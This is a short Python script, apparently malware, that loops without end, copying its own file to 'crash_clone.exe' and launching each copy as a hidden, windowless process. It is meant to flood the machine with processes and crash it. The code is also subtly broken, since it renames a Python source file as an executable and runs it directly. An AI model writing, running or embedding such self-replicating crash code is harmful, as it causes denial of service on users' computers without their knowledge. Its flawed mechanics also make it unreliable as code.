import os
import shutil
import subprocess

replica_name = "crash_clone.exe"

# Get path of the current script
current_file = os.path.abspath(__file__)

while True:
    # Define a new file path in the same directory
    replica_path = os.path.join(os.getcwd(), replica_name)

    # Copy the current file to the new location
    shutil.copy(current_file, replica_path)

    # Execute the newly created replica
    subprocess.Popen(replica_path, creationflags=subprocess.CREATE_NO_WINDOW)
